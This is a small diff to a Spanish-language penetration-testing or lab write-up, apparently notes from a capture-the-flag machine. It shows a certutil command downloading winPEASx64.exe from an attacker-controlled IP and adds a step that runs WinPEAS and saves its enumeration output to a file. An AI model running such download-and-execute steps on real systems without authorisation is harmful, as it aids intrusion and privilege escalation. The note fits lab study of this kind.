@@ -331,6 +331,8 @@ después de enumerar un buen rato el sistema no hemos encontrado un vector de at
 certutil.exe -f -urlcache -split http://10.10.14.73:9006/winPEASx64.exe
 ```
 
+`.\WinPEAS.exe > Output.txt`
+ejecutamos el WinPEAS.exe y guardamos el Output en un archivo .
 ![[Pasted image 20240724160615.png]]
 
 `wget`
